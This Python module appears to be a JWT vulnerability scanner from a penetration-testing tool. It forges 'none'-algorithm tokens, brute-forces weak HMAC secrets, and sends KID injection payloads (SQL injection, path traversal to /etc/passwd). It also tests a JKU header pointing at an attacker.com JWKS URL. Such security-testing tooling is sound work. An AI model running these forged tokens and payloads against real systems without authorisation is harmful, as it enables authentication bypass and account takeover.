"""
JWT Security Testing
Algorithm confusion, none algorithm, weak secrets, key injection
Reference: https://portswigger.net/web-security/jwt

All requests routed through ZAP for unified logging and alerting.
"""
import base64
import hashlib
import hmac
import json
import re
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, TYPE_CHECKING

if TYPE_CHECKING:
    from modules.zap_http_client import ZAPHttpClient


@dataclass
class JWTAttackResult:
    url: str
    attack_type: str
    vulnerable: bool
    confidence: float
    evidence: Dict
    severity: str = "Critical"
    cwe: str = "CWE-327"
    cvss: float = 9.8


class JWTAttackTester:
    """
    Test for JWT vulnerabilities
    - 'none' algorithm bypass
    - Weak HMAC secrets
    - Algorithm confusion (RS256 → HS256)
    - Key injection via JKU/X5U headers
    - KID injection
    """

    # Common weak secrets for brute-force
    WEAK_SECRETS = [
        'secret', 'password', 'admin', '123456', 'key', 'jwt',
        'secret123', 'jwt_secret', 'your-256-bit-secret', 'supersecret',
        'HS256-secret', 'changeme', 'development', 'test', 'demo',
        'qwerty', 'letmein', 'password123', 'jwt-secret', 'secretkey',
        'private', 'public', 'default', 'token', 'auth', 'sign',
        'aaaa', 'abcd', '1234', 'xxxx', 'test123', 'dev', 'prod'
    ]

    # Algorithm confusion targets
    RSA_ALGORITHMS = ['RS256', 'RS384', 'RS512', 'PS256', 'PS384', 'PS512']
    HMAC_ALGORITHMS = ['HS256', 'HS384', 'HS512']

    def __init__(self, har_data: Dict, config: Dict = None,
                 zap_client: 'ZAPHttpClient' = None):
        self.har_data = har_data
        self.config = config or {}
        self.wordlist = self.config.get('jwt_wordlist', self.WEAK_SECRETS)
        self.timeout = self.config.get('jwt_timeout', 10)
        self.zap_client = zap_client
        self._use_zap = zap_client is not None

    def _get(self, url: str, headers: Dict = None,
             cookies: Dict = None) -> Optional[Dict]:
        """HTTP GET via ZAP or fallback to requests"""
        try:
            if self._use_zap:
                # Merge cookies into headers
                if cookies:
                    cookie_str = '; '.join(f"{k}={v}" for k, v in cookies.items())
                    headers = headers or {}
                    headers['Cookie'] = cookie_str
                resp = self.zap_client.get(url, headers=headers)
                return {
                    'status_code': resp.status_code,
                    'headers': resp.headers,
                    'text': resp.text,
                    'content': resp.content
                }
            else:
                import requests
                resp = requests.get(url, headers=headers, cookies=cookies,
                                   timeout=self.timeout, verify=False)
                return {
                    'status_code': resp.status_code,
                    'headers': dict(resp.headers),
                    'text': resp.text,
                    'content': resp.content
                }
        except Exception:
            return None

    def _raise_alert(self, result: 'JWTAttackResult'):
        """Raise ZAP alert for finding"""
        if self._use_zap and result.vulnerable:
            self.zap_client.raise_alert(
                risk=3,  # High
                name=f"JWT: {result.attack_type}",
                description=f"JWT vulnerability: {result.attack_type}",
                url=result.url,
                evidence=str(result.evidence),
                solution="Validate JWT algorithm explicitly, use strong secrets",
                cwe_id=327
            )

    def extract_jwts(self) -> List[Dict]:
        """Extract JWTs from HAR data"""
        jwts = []
        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

        entries = self.har_data.get('log', {}).get('entries', [])

        for entry in entries:
            request = entry.get('request', {})
            url = request.get('url', '')

            # Headers
            for header in request.get('headers', []):
                for match in jwt_pattern.findall(header.get('value', '')):
                    jwts.append({
                        'token': match,
                        'location': f"Header:{header['name']}",
                        'url': url,
                        'header_name': header['name']
                    })

            # Cookies
            for cookie in request.get('cookies', []):
                for match in jwt_pattern.findall(cookie.get('value', '')):
                    jwts.append({
                        'token': match,
                        'location': f"Cookie:{cookie['name']}",
                        'url': url,
                        'cookie_name': cookie['name']
                    })

            # Body
            body = request.get('postData', {}).get('text', '')
            for match in jwt_pattern.findall(body):
                jwts.append({
                    'token': match,
                    'location': 'Body',
                    'url': url
                })

        # Deduplicate by token
        seen = set()
        unique = []
        for jwt_data in jwts:
            if jwt_data['token'] not in seen:
                seen.add(jwt_data['token'])
                unique.append(jwt_data)

        return unique

    @staticmethod
    def decode_jwt(token: str) -> Tuple[Optional[Dict], Optional[Dict], str]:
        """Decode JWT without verification"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, None, ''

            def decode_part(part: str) -> Dict:
                padding = 4 - len(part) % 4
                if padding != 4:
                    part += '=' * padding
                decoded = base64.urlsafe_b64decode(part)
                return json.loads(decoded)

            header = decode_part(parts[0])
            payload = decode_part(parts[1])
            signature = parts[2]

            return header, payload, signature
        except Exception:
            return None, None, ''

    @staticmethod
    def encode_jwt_part(data: Dict) -> str:
        """Encode dict to JWT base64url format"""
        json_str = json.dumps(data, separators=(',', ':'))
        return base64.urlsafe_b64encode(json_str.encode()).decode().rstrip('=')

    def create_none_token(self, payload: Dict) -> str:
        """Create JWT with 'none' algorithm"""
        none_header = {'alg': 'none', 'typ': 'JWT'}
        header_b64 = self.encode_jwt_part(none_header)
        payload_b64 = self.encode_jwt_part(payload)
        return f"{header_b64}.{payload_b64}."

    def create_hmac_token(self, payload: Dict, secret: str, alg: str = 'HS256') -> str:
        """Create JWT with HMAC signature"""
        header = {'alg': alg, 'typ': 'JWT'}
        header_b64 = self.encode_jwt_part(header)
        payload_b64 = self.encode_jwt_part(payload)

        message = f"{header_b64}.{payload_b64}"

        alg_to_hash = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }

        hash_func = alg_to_hash.get(alg, hashlib.sha256)
        signature = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), message.encode(), hash_func).digest()
        ).decode().rstrip('=')

        return f"{message}.{signature}"

    def _make_request_with_token(self, jwt_data: Dict, new_token: str) -> Optional[Dict]:
        """Make request with modified JWT"""
        url = jwt_data['url']
        location = jwt_data['location']

        if location.startswith('Header:'):
            header_name = jwt_data.get('header_name', 'Authorization')
            if 'Bearer' in location or 'Authorization' in location:
                headers = {header_name: f"Bearer {new_token}"}
            else:
                headers = {header_name: new_token}
            return self._get(url, headers=headers)

        elif location.startswith('Cookie:'):
            cookie_name = jwt_data.get('cookie_name', 'token')
            return self._get(url, cookies={cookie_name: new_token})
        else:
            return self._get(url, headers={'Authorization': f"Bearer {new_token}"})

    def test_none_algorithm(self, jwt_data: Dict) -> Optional[JWTAttackResult]:
        """Test 'none' algorithm vulnerability"""
        token = jwt_data['token']
        header, payload, _ = self.decode_jwt(token)

        if not header or not payload:
            return None

        # Create none token
        none_token = self.create_none_token(payload)

        # Also test with variants
        none_variants = [
            {'alg': 'none', 'typ': 'JWT'},
            {'alg': 'None', 'typ': 'JWT'},
            {'alg': 'NONE', 'typ': 'JWT'},
            {'alg': 'nOnE', 'typ': 'JWT'},
        ]

        for variant_header in none_variants:
            test_token = f"{self.encode_jwt_part(variant_header)}.{self.encode_jwt_part(payload)}."

            response = self._make_request_with_token(jwt_data, test_token)

            if response and response['status_code'] == 200:
                # Verify not just a public endpoint
                original_response = self._make_request_with_token(jwt_data, token)
                if original_response and original_response['status_code'] == 200:
                    # Un vrai bypass « none » sert la MÊME ressource que le token
                    # valide. On confirme réellement (le code ne testait que la
                    # longueur) : corps substantiel, absence de marqueurs d'erreur
                    # d'auth, ET similarité de taille avec la réponse d'origine.
                    # Sinon un 200 {"error":"invalid token"} passait pour une vuln.
                    none_body = (response.get('text') or '').lower()
                    error_markers = ('invalid', 'error', 'unauthorized',
                                     'expired', 'denied', 'forbidden', 'signature')
                    has_error = any(m in none_body for m in error_markers)
                    orig_len = len(original_response['content'])
                    none_len = len(response['content'])
                    similar = orig_len > 0 and min(none_len, orig_len) / max(none_len, orig_len) > 0.7
                    if none_len > 100 and not has_error and similar:
                        result = JWTAttackResult(
                            url=jwt_data['url'],
                            attack_type='none_algorithm',
                            vulnerable=True,
                            confidence=0.9,
                            evidence={
                                'original_alg': header.get('alg'),
                                'bypass_alg': variant_header['alg'],
                                'response_status': response['status_code'],
                                'response_length': len(response['content'])
                            },
                            severity="Critical"
                        )
                        self._raise_alert(result)
                        return result

        return None

    def test_weak_secret(self, jwt_data: Dict) -> Optional[JWTAttackResult]:
        """Test for weak HMAC secrets via brute-force"""
        token = jwt_data['token']
        header, payload, signature = self.decode_jwt(token)

        if not header or header.get('alg') not in self.HMAC_ALGORITHMS:
            return None

        parts = token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        alg = header['alg']

        alg_to_hash = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }
        hash_func = alg_to_hash.get(alg, hashlib.sha256)

        for secret in self.wordlist:
            computed_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hash_func).digest()
            ).decode().rstrip('=')

            if computed_sig == signature:
                return JWTAttackResult(
                    url=jwt_data['url'],
                    attack_type='weak_secret',
                    vulnerable=True,
                    confidence=1.0,
                    evidence={
                        'secret': secret,
                        'algorithm': alg,
                        'can_forge_tokens': True
                    },
                    severity="Critical",
                    cwe="CWE-321"
                )

        return None

    def test_algorithm_confusion(self, jwt_data: Dict) -> Optional[JWTAttackResult]:
        """
        Test RS256 to HS256 algorithm confusion
        Attack: Sign token using server's public key as HMAC secret
        """
        token = jwt_data['token']
        header, payload, _ = self.decode_jwt(token)

        if not header or header.get('alg') not in self.RSA_ALGORITHMS:
            return None

        # We can only identify potential - actual exploit requires public key
        # Try common public key locations
        public_key_urls = [
            jwt_data['url'].split('/api')[0] + '/.well-known/jwks.json',
            jwt_data['url'].split('/api')[0] + '/jwks.json',
            jwt_data['url'].split('/api')[0] + '/oauth/jwks',
        ]

        jwks_found = False
        for jwks_url in public_key_urls:
            resp = self._get(jwks_url)
            if resp and resp['status_code'] == 200 and 'keys' in resp['text']:
                jwks_found = True
                break

        return JWTAttackResult(
            url=jwt_data['url'],
            attack_type='algorithm_confusion_potential',
            vulnerable=jwks_found,
            confidence=0.5 if jwks_found else 0.2,
            evidence={
                'current_algorithm': header.get('alg'),
                'attack_algorithm': 'HS256',
                'jwks_found': jwks_found,
                'manual_test_required': True,
                'note': 'Test with: sign payload using public key as HS256 secret'
            },
            severity="High" if jwks_found else "Info",
            cvss=8.0 if jwks_found else 0.0
        )

    def test_kid_injection(self, jwt_data: Dict) -> Optional[JWTAttackResult]:
        """
        Test KID (Key ID) header injection
        Attack: SQL injection, path traversal in kid parameter
        """
        token = jwt_data['token']
        header, payload, _ = self.decode_jwt(token)

        if not header or 'kid' not in header:
            return None

        # Test payloads for KID
        kid_payloads = [
            # SQL injection
            "' UNION SELECT 'secret' -- ",
            "' OR '1'='1",
            # Path traversal to known file
            "../../../dev/null",
            "/dev/null",
            "../../../../../../etc/passwd",
            # Empty file for predictable secret
            "/proc/sys/kernel/random/uuid",
        ]

        original_kid = header.get('kid', '')

        for kid_payload in kid_payloads:
            # Create test token
            test_header = header.copy()
            test_header['kid'] = kid_payload

            # For path traversal to /dev/null, secret is empty
            if '/dev/null' in kid_payload:
                secret = ''
            else:
                secret = 'secret'  # Common default

            try:
                test_token = self.create_hmac_token(payload, secret, header.get('alg', 'HS256'))
                # Replace header
                parts = test_token.split('.')
                parts[0] = self.encode_jwt_part(test_header)
                test_token = '.'.join(parts)

                response = self._make_request_with_token(jwt_data, test_token)

                # `response` est le dict renvoyé par `_make_request_with_token` :
                # accès par clé, sinon AttributeError avalée → attaque KID morte.
                if response and response['status_code'] == 200 and len(response['content']) > 100:
                    return JWTAttackResult(
                        url=jwt_data['url'],
                        attack_type='kid_injection',
                        vulnerable=True,
                        confidence=0.7,
                        evidence={
                            'original_kid': original_kid,
                            'injected_kid': kid_payload,
                            'response_status': response['status_code']
                        },
                        severity="Critical"
                    )

            except Exception:
                pass

        return None

    def test_jku_injection(self, jwt_data: Dict) -> Optional[JWTAttackResult]:
        """
        Test JKU (JWK Set URL) header injection
        Attack: Point to attacker-controlled JWKS
        """
        token = jwt_data['token']
        header, payload, _ = self.decode_jwt(token)

        if not header:
            return None

        # Check if JKU is already present
        has_jku = 'jku' in header

        # Create token with JKU pointing to canary URL
        test_header = header.copy()
        test_header['jku'] = 'https://attacker.com/jwks.json'

        # We can't actually verify this without setting up a listener
        # Just report if JKU is already present or if it might be accepted
        return JWTAttackResult(
            url=jwt_data['url'],
            attack_type='jku_injection_potential',
            vulnerable=has_jku,
            confidence=0.3,
            evidence={
                'jku_present': has_jku,
                'current_jku': header.get('jku', 'none'),
                'manual_test_required': True,
                'note': 'Set up JWKS endpoint and test with: jku -> attacker_url'
            },
            severity="Medium" if has_jku else "Info",
            cvss=5.0 if has_jku else 0.0
        )

    def run_tests(self) -> List[JWTAttackResult]:
        """Execute all JWT attack tests"""
        print("[JWTAttack] Scanning for JWT vulnerabilities...")

        jwts = self.extract_jwts()
        print(f"[JWTAttack] Found {len(jwts)} unique JWTs")

        results = []

        for jwt_data in jwts:
            header, payload, _ = self.decode_jwt(jwt_data['token'])
            if header:
                print(f"[JWTAttack] Testing: {header.get('alg', 'unknown')} at {jwt_data['location']}")

            # None algorithm
            result = self.test_none_algorithm(jwt_data)
            if result and result.vulnerable:
                results.append(result)
                print(f"[JWTAttack] 🚨 'none' algorithm bypass!")

            # Weak secret
            result = self.test_weak_secret(jwt_data)
            if result and result.vulnerable:
                results.append(result)
                print(f"[JWTAttack] 🚨 Weak secret: {result.evidence['secret']}")

            # Algorithm confusion
            result = self.test_algorithm_confusion(jwt_data)
            if result:
                results.append(result)
                if result.vulnerable:
                    print(f"[JWTAttack] ⚠️ Algorithm confusion possible (JWKS found)")

            # KID injection
            result = self.test_kid_injection(jwt_data)
            if result and result.vulnerable:
                results.append(result)
                print(f"[JWTAttack] 🚨 KID injection!")

            # JKU injection
            result = self.test_jku_injection(jwt_data)
            if result:
                results.append(result)

        return results

    def generate_report(self, results: List[JWTAttackResult]) -> Dict:
        """Generate summary report"""
        return {
            'total_jwts_found': len(self.extract_jwts()),
            'vulnerable_count': len([r for r in results if r.vulnerable]),
            'findings': [
                {
                    'url': r.url,
                    'attack_type': r.attack_type,
                    'confidence': r.confidence,
                    'severity': r.severity,
                    'cwe': r.cwe,
                    'evidence': r.evidence
                }
                for r in results
            ]
        }
